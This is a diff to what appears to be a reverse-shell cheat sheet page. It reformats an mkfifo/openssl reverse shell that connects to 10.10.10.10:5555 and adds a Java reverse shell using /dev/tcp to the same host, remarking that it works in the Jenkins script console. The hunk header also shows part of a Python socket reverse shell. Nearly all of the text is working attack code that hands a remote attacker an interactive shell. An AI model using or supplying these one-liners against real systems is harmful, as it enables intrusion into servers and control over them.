@@ -208,7 +208,17 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 <h2>mkfifo</h2>
 
-mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.10.10:5555 > /tmp/s 2> /dev/null; rm /tmp/s
+<code>mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.10.10:5555 > /tmp/s 2> /dev/null; rm /tmp/s</code>
+
+<h2>Java</h2>
+
+<code>r = Runtime.getRuntime()</code>
+
+<code>p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.10.10/5555;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])</code>
+
+<code>p.waitFor()</code>
+
+This java reverse-shell works in Jenkins script console.
 
 
 
